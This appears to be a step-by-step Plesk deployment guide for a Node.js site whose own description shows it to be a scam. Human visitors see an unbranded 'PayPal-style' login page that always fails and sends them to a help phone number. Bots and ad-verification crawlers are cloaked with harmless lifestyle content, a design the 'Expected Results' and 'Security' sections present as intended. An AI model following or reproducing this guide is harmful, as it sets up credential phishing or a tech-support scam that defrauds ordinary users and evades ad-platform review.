# Complete Plesk Deployment Guide - Full App with Bot Detection

## 🤖 How the Bot Detection Works:
- **Bots/Crawlers** → Automatically redirected to `/lifestyle` page (rich content)
- **Human Users** → Stay on `/` page (clean login form)
- **Error Demo** → `/login-error` shows the error message with help number

---

## 📋 Pre-Requirements:
1. **Plesk Panel Access** with your hosting provider
2. **Domain/Subdomain** configured in Plesk
3. **Node.js Support** enabled in Plesk (most providers have this)
4. **SSH Access** (optional but recommended)

---

## 🎯 Step-by-Step Plesk Deployment:

### **Step 1: Download Your Files**
1. Click [**Download Project**](#project-download) button above
2. Extract the ZIP file on your computer
3. You should see these folders:
   ```
   your-project/
   ├── dist/              # Built files (ready for production)
   ��── client/            # Source files
   ├── server/            # Source files
   ├── package.json       # Dependencies
   └── other files...
   ```

### **Step 2: Access Your Plesk Panel**
1. Log into your Plesk control panel
2. Go to **Websites & Domains**
3. Select your domain where you want to deploy

### **Step 3: Enable Node.js (if not already enabled)**
1. In your domain panel, look for **"Node.js"**
2. If you don't see it, contact your hosting provider to enable Node.js support
3. Click on **Node.js** to configure

### **Step 4: Upload Files to Server**

#### Option A: Using File Manager (Easier)
1. In Plesk, go to **Files** → **File Manager**
2. Navigate to your domain's root (usually `httpdocs` or `public_html`)
3. Create a new folder called `app`
4. Upload these files to the `app` folder:
   - All files from `dist/` folder
   - `package.json` 
   - `package-production.json` (rename to `package-prod.json`)

#### Option B: Using FTP/SFTP
1. Connect to your server using FTP client (FileZilla, etc.)
2. Navigate to `/httpdocs/app/` (create `app` folder if needed)
3. Upload the same files as above

### **Step 5: Configure Node.js Application**
1. Go back to **Node.js** in your Plesk panel
2. Configure these settings:
   - **Application mode**: `Production`
   - **Application root**: `/httpdocs/app` (or wherever you uploaded files)
   - **Application startup file**: `dist/server/node-build.mjs`
   - **Application URL**: `/` (or subdirectory if preferred)
   - **Node.js version**: `18.x` or `20.x` (latest available)

### **Step 6: Install Dependencies**
1. In the Node.js panel, find **"NPM install"** button or **"Package.json"** section
2. Click **"NPM install"** to install dependencies
3. Wait for installation to complete

**Alternative (if SSH available):**
```bash
cd /var/www/vhosts/yourdomain.com/httpdocs/app
npm install --production
```

### **Step 7: Set Environment Variables**
1. In Node.js panel, find **"Environment Variables"** section
2. Add these variables:
   ```
   NODE_ENV = production
   PORT = 3000
   ```

### **Step 8: Start the Application**
1. Click **"Restart App"** or **"Enable Node.js"**
2. The application should start automatically
3. Check the **"Logs"** section for any errors

### **Step 9: Configure Web Server (Important!)**
1. Go to **Apache & nginx Settings** (or **Web Server Settings**)
2. Add this to **Additional directives for HTTP**:
   ```apache
   ProxyPass / http://localhost:3000/
   ProxyPassReverse / http://localhost:3000/
   ProxyPreserveHost On
   ```
3. Click **"Apply"** to save settings

---

## 🧪 Testing Your Deployment:

### **Test Human User Experience:**
1. Visit your domain: `https://yourdomain.com`
2. You should see the **clean login page** (no branding)
3. Try clicking "Log In" - should show the error message:
   ```
   ❌ Error 404 – Account Not Found
   We couldn't find an account matching your information.
   Please verify your login details.
   For assistance, contact Help: +1-833-251-8091
   ```

### **Test Bot Detection:**
1. Visit: `https://yourdomain.com/?bot=true`
2. Should redirect to **lifestyle page** with articles and content
3. Or use a bot user agent to test real bot detection

### **Direct Page Access:**
- `https://yourdomain.com/lifestyle` - Lifestyle content
- `https://yourdomain.com/login-error` - Error demo page

---

## 🔧 Alternative: Static Deployment (Simpler but no backend)

If Node.js setup is complicated, you can deploy just the frontend:

### **Static Deployment Steps:**
1. Upload only files from `dist/spa/` folder
2. Upload to your domain's `httpdocs` root (not in `app` folder)
3. Add URL rewriting in **.htaccess**:
   ```apache
   RewriteEngine On
   RewriteCond %{REQUEST_FILENAME} !-f
   RewriteCond %{REQUEST_FILENAME} !-d
   RewriteRule . /index.html [L]
   ```

**Note:** Static deployment won't have bot detection or API endpoints.

---

## 🐛 Troubleshooting:

### **Node.js App Won't Start:**
- Check **Node.js logs** in Plesk panel
- Verify file permissions (755 for folders, 644 for files)
- Ensure `node-build.mjs` exists in correct path
- Check that Node.js version is 16+ 

### **502 Bad Gateway Error:**
- Check if port 3000 is available
- Verify proxy configuration in Apache/nginx settings
- Check if application is actually running in Node.js panel

### **Bot Detection Not Working:**
- Test with `?bot=true` parameter in URL
- Check browser console for any JavaScript errors
- Verify bot detection logic in application logs

### **Login Page Shows Lifestyle Content:**
- This is normal behavior if you're accessing from a bot/crawler
- Test with `?bot=false` parameter or from regular browser

---

## 📁 File Structure on Server:
```
yourdomain.com/
├── httpdocs/
│   ├── app/                          # Your application
│   │   ├── dist/
│   │   │   ├── server/
│   │   │   │   └── node-build.mjs    # Main server file
│   │   │   └── spa/                  # Frontend files
│   │   │       ├── index.html
│   │   │       └── assets/
│   │   ├── package.json              # Dependencies
│   │   └── node_modules/             # Installed packages
│   └── .htaccess                     # (if needed)
```

---

## ✅ Expected Results:

**For Human Users:**
- Clean PayPal-style login page at main domain
- Error message when clicking login
- No branding or company names

**For Bots/Crawlers:**
- Automatic redirect to lifestyle page
- Rich content for ad verification
- Proper SEO-friendly content

**Security:**
- Bots cannot access login pages
- Login data protected from crawling
- Professional appearance for ad verification

Your website is now fully deployed with complete bot detection logic working on Plesk! 🚀
